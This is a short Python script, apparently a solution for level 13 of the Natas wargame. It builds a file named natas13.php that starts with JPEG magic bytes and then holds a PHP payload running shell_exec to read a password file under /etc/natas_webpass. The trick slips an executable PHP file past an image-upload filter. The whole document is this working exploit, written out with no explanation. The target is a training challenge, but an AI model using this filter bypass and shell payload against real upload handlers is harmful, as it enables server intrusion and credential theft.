php_command="<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>"

jpeg_header=b'\xFF\xD8\xFF\xE0'

with open('natas13.php', 'wb') as f:
    f.write(jpeg_header)
    f.write(php_command.encode('utf-8'))

print("PHP file created successfully.")